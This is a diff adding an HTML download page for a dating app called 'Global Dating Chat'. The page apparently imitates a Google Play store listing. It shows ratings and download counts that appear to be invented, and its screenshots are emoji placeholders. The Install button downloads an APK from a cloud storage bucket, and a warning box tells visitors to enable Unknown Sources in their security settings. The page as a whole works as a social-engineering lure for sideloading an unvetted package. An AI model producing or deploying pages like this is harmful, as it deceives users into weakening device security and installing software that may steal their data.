@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Dating Chat - Download App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: #f8f9fa;
+        }
+        .header {
+            background: white;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            padding: 16px 24px;
+        }
+        .header h1 {
+            font-size: 20px;
+            color: #5f6368;
+            font-weight: 400;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 24px;
+        }
+        .app-card {
+            background: white;
+            border-radius: 8px;
+            padding: 24px;
+            margin-bottom: 24px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12);
+        }
+        .app-header {
+            display: flex;
+            gap: 24px;
+            margin-bottom: 24px;
+        }
+        .app-icon {
+            width: 120px;
+            height: 120px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 60px;
+            flex-shrink: 0;
+        }
+        .app-info {
+            flex: 1;
+        }
+        .app-title {
+            font-size: 28px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 4px;
+        }
+        .app-developer {
+            color: #01875f;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        .rating {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+        .rating-box {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+        .rating-number {
+            font-size: 14px;
+            color: #5f6368;
+        }
+        .stars {
+            color: #01875f;
+            font-size: 12px;
+        }
+        .download-btn {
+            background: #01875f;
+            color: white;
+            border: none;
+            padding: 12px 32px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            transition: background 0.2s;
+        }
+        .download-btn:hover {
+            background: #017a54;
+        }
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+        .info-item {
+            text-align: center;
+            padding: 16px;
+        }
+        .info-label {
+            font-size: 12px;
+            color: #5f6368;
+            margin-bottom: 4px;
+        }
+        .info-value {
+            font-size: 14px;
+            color: #202124;
+            font-weight: 500;
+        }
+        .section-title {
+            font-size: 20px;
+            color: #202124;
+            margin-bottom: 16px;
+            font-weight: 400;
+        }
+        .about-text {
+            color: #5f6368;
+            line-height: 1.6;
+            margin-bottom: 16px;
+        }
+        .features {
+            display: grid;
+            gap: 12px;
+        }
+        .feature {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: #f8f9fa;
+            border-radius: 8px;
+        }
+        .feature-icon {
+            font-size: 24px;
+        }
+        .feature-text {
+            color: #202124;
+            font-size: 14px;
+        }
+        .screenshots {
+            display: flex;
+            gap: 16px;
+            overflow-x: auto;
+            padding: 16px 0;
+        }
+        .screenshot {
+            width: 200px;
+            height: 400px;
+            background: linear-gradient(135deg, #667eea, #764ba2);
+            border-radius: 12px;
+            flex-shrink: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 48px;
+        }
+        .warning-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc107;
+            padding: 16px;
+            margin: 24px 0;
+            border-radius: 4px;
+        }
+        .warning-title {
+            font-weight: 500;
+            color: #856404;
+            margin-bottom: 8px;
+        }
+        .warning-text {
+            color: #856404;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>Global Dating Chat</h1>
+    </div>
+
+    <div class="container">
+        <div class="app-card">
+            <div class="app-header">
+                <div class="app-icon">💕</div>
+                <div class="app-info">
+                    <h1 class="app-title">Global Dating Chat</h1>
+                    <div class="app-developer">VineBre Apps</div>
+                    <div class="rating">
+                        <div class="rating-box">
+                            <span class="rating-number">4.5</span>
+                            <span class="stars">★★★★★</span>
+                        </div>
+                        <div class="rating-number">1K+ downloads</div>
+                        <div class="rating-number">Rated for 18+</div>
+                    </div>
+                    <a href="https://nyc.cloud.appwrite.io/v1/storage/buckets/apk-downloads/files/6966d5fa00077407d8b1/download?project=69652130002a7bb2081f" class="download-btn" download="global-dating-chat.apk">
+                        Install
+                    </a>
+                </div>
+            </div>
+
+            <div class="info-grid">
+                <div class="info-item">
+                    <div class="info-label">Downloads</div>
+                    <div class="info-value">1,000+</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Size</div>
+                    <div class="info-value">35 MB</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Version</div>
+                    <div class="info-value">1.0.0</div>
+                </div>
+                <div class="info-item">
+                    <div class="info-label">Updated</div>
+                    <div class="info-value">Jan 2025</div>
+                </div>
+            </div>
+
+            <div class="warning-box">
+                <div class="warning-title">⚠️ Installation Required</div>
+                <div class="warning-text">
+                    To install this app, go to Settings → Security → Unknown Sources and enable it.
+                </div>
+            </div>
+        </div>
+
+        <div class="app-card">
+            <h2 class="section-title">About this app</h2>
+            <p class="about-text">
+                Connect with people worldwide through Global Dating Chat. Meet new friends, find romance, 
+                and build meaningful relationships with our global community. Features live streaming, 
+                video calls, and real-time messaging.
+            </p>
+            <div class="features">
+                <div class="feature">
+                    <span class="feature-icon">💬</span>
+                    <span class="feature-text">Real-time messaging and chat</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">📹</span>
+                    <span class="feature-text">Live streaming and video calls</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">📸</span>
+                    <span class="feature-text">Photo sharing and galleries</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">🪙</span>
+                    <span class="feature-text">Earn coins by watching ads</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">⚡</span>
+                    <span class="feature-text">Boost your profile for visibility</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">🌍</span>
+                    <span class="feature-text">Connect with users worldwide</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="app-card">
+            <h2 class="section-title">Screenshots</h2>
+            <div class="screenshots">
+                <div class="screenshot">📱</div>
+                <div class="screenshot">💬</div>
+                <div class="screenshot">📹</div>
+                <div class="screenshot">👤</div>
+            </div>
+        </div>
+
+        <div class="app-card">
+            <h2 class="section-title">Data safety</h2>
+            <p class="about-text">
+                Safety starts with understanding how developers collect and share your data. 
+                Data privacy and security practices may vary based on your use, region, and age.
+            </p>
+            <div class="features">
+                <div class="feature">
+                    <span class="feature-icon">🔒</span>
+                    <span class="feature-text">Data is encrypted in transit</span>
+                </div>
+                <div class="feature">
+                    <span class="feature-icon">🗑️</span>
+                    <span class="feature-text">You can request data deletion</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
